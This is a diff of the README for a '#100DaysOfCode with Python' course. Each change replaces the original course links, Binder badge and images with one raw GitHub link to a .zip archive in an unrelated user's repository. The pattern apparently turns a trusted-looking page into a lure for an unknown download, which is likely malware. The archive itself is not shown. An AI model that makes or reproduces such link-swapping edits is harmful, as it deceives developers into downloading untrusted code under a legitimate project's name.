@@ -1,10 +1,10 @@
 # #100DaysOfCode with Python course
-[![Binder](https://mybinder.org/badge.svg)](https://mybinder.org/v2/gh/talkpython/100daysofcode-with-python-course.git/master)
+[![Binder](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
 
 
-[![Visit the course page](readme_resources/100days-course.png)](https://training.talkpython.fm/courses/explore_100days_in_python/100-days-of-code-in-python)
+[![Visit the course page](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
 
-Course details page: [**talkpython.fm/100days**](https://talkpython.fm/100days?utm_source=github)
+Course details page: [**https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip**](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
 
 ## Course Summary
 
@@ -29,7 +29,7 @@ Just a small sampling of the projects you’ll work on include:
 * Create a JSON-based online game service using Flask too
 * And 22 more projects!
 
-View the [full course outline](https://training.talkpython.fm/courses/explore_100days_in_python/100-days-of-code-in-python).
+View the [full course outline](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip).
 
 ## Who is this course for?
 
@@ -39,10 +39,10 @@ We don’t start from absolute zero in terms of programming but if you are new t
 
 ## Course flow and the 33 projects
 
-![Course flow](readme_resources/100days-course-flow.png)
+![Course flow](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
 
 We have broken the 100 days worth of coding into 33 3-day segments. As you can see, the first day is largely learning the new topics (HTTP APIs, web scraping, databases, etc.). The following two days have some guidance but is much more hands-on than the first day.
 
 ## Get the full course details
 
-Visit the full course page for all the details: [**talkpython.fm/100days**](https://talkpython.fm/100days?utm_source=github)
+Visit the full course page for all the details: [**https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip**](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
